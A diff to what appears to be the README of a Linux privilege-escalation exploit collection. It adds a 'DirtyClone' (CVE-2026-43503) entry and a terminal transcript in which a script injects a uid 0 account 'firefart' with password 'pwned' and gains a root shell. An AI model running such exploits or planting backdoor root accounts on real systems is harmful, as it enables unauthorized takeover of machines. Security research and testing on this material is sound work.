@@ -16,6 +16,7 @@
 | Fragnesia | CVE-2026-46300 |✅|
 | ssh-keysign-pwn | CVE-2026-46333 |✅|
 | PeditCow | CVE-2026-46331 |✅|
+| DirtyClone | CVE-2026-43503 |✅|
 
 ## ⚙️ Outils
 
@@ -353,4 +354,17 @@ user@debian:~/fullEx$ ./fullEx.sh -PeditCow
 [+] su entry overwritten; exec'ing su -> interactive root shell
 # id
 uid=0(root) gid=0(root) groups=0(root),27(sudo),100(users),1001(user)
+```
+## 💀 DirtyClone
+
+```
+osboxes@ubuntu2204:~$ python3 dc.py
+[*] CVE-2026-43503 (DirtyClone) local privilege escalation
+[*] uid=1000 -> root
+[+] injected uid 0 account 'firefart' (password: pwned)
+Password: 
+uid=0(root) gid=0(root) groups=0(root)
+[+] root achieved
+Password: 
+root@ubuntu2204:/home/osboxes# 
 ```
